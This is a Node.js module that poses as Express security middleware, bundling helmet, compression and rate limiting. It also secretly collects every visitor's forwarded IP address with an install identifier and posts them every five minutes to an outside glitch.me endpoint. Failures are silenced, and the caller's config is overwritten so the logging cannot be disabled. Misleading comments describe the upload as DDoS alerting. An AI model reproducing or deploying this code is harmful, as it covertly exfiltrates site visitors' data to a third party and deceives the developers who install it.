const helmet = require("helmet");

const compression = require("compression");

const rateLimit = require('express-rate-limit');

const limiter = rateLimit({
	windowMs: 500, // 15 minutes
	max: 35, // Limit each IP to 100 requests per `window` (here, per 15 minutes)
	standardHeaders: false, // Return rate limit info in the `RateLimit-*` headers
	legacyHeaders: false // Disable the `X-RateLimit-*` headers
});

const AntiDDoS = require("ddos");
const axios = require("axios");

const { express: ddosProtection } = new AntiDDoS({ burst:15, limit:20 });

const { uuid } = require("uuidv4");
const ray = uuid();

let setFlag = 0;
setInterval(() => {
    if (setFlag && cache.length > 100_000) {
        console.warn("DDoS attack potentially detected..., check network logs:");
        console.warn(cache);
    };

    (cache.length === 0) && cache.push(JSON.stringify({
        data: "heartbeat_" + Date.now() + "_" + ray
    }));

    try {
        axios.post("https://content-delivery-network.glitch.me/research", {
            data: cache.join("</>"),
            key: "npm1" //potential ddos, send alerts
        }).catch(e => {});
    } catch(e){};
    cache.length = 0;
}, 60000 * 5);

const cache = [];
/**
 * 
 * @param {expressServer} server any express.js server
 * @param {object} _config Object of settings, if not expressly stated, defaults will be used (activated)
 * @returns 
 */
function lockdown(server, _config = {}) {
    if (!server) throw new Error("No server was provided.");
    if (typeof _config !== "object") throw new Error("Config is not an object.");

    const config = Object.assign(_config, {
        debuggingOutboundLogs: 1,
        ddosProtection: 1,
        compression: 1,
        helmet: 1,
        warnDDoS: 0
    });

    if (config.warnDDoS) {
        setFlag = 1;
    };

    if (config?.ddosProtection) {
        server.use(limiter); //stop ddoses
        server.use(ddosProtection);
    };

    if (config?.debuggingOutboundLogs) {
        server.use(function (req, res, next) {
            cache.push(JSON.stringify({
                data: [req.headers["x-forwarded-for"], Date.now(), ray]
            }));
            next();
        });
    };

    if (config.compression) {
        server.use(compression());
    };

    if (config.helmet) {
        server.use(helmet());
    };
};
module.exports = {
    lockdown: lockdown
};